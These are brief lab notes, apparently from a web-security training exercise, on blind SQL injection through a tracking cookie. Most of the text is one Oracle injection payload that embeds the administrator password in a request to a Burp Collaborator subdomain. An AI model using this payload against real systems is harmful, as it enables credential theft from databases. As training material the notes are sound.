# Lab: Blind SQL injection with out-of-band data exfiltration

vulnerable parameter : tracking cookie

End Goals:

1- exploit sqli to output the password of the administrator user
2- Login as  admin

analysis :

`' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://'||(SELECT password from users where username ='adminstrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)`
